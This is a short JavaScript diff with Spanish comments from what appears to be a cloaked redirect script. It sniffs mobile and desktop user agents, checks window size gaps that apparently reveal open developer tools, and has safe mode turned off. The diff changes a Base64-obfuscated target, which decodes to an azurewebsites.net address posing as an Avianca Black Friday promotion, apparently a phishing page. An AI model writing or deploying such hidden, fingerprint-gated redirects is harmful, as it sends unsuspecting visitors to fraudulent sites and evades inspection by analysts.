@@ -7,7 +7,7 @@
   const MOBILE_REGEX = /Mobi|Android|iPhone|iPad|iPod/i;           // detecta móviles/tablets
   const DESKTOP_MARKERS = /Windows NT|Macintosh|X11|CrOS|Linux/i; // marcadores típicos de escritorio
   const SIZE_DIFF_THRESHOLD = 160;                                // umbral heurístico outer - inner
-  const ENCODED_TARGET = "YXZpYW5jYXByb21vYmxhY2tmcmlkYXkuYXp1cmV3ZWJzaXRlcy5uZXQvYmxhY2tmcmlkYXk="; // Base64 original
+  const ENCODED_TARGET = "aHR0cHM6Ly9hdmlhbmNhcHJvbW9ibGFja2ZyaWRheS5henVyZXdlYnNpdGVzLm5ldC9ibGFja2ZyaWRheS8="; // Base64 original
 
   // safeMode = true => no redirige, solo muestra en consola. Cambia a false para activar.
   const safeMode = false;
